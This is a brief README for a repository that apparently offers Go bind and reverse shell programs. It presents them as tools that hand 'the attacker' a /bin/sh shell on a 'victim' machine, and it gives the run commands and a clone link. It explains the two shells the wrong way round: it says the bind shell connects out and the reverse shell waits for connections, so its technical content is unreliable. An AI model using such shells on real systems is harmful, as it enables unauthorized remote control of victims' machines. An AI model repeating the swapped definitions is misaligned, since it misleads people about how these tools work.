# bind_and_reverseShell_golang

bind and reverse shell code -- Golang


<h3>FEATURES</h3>
<p> The bind shell code connects to a system on the specified ip and port, and it returns the bin/sh shell for the attacker to perform their action</p>
<p> The reverse shell starts a connection and wait for the victim to connect, and provide bin/sh shell for the attacker when the victim connects</p>

<h3>USAGE</h3>

go run bindShell.go ip:port

go run revShell.go ip:port 


<h3>GET</h3>

git clone https://github.com/iconfig/bind_and_reverseShell_golang
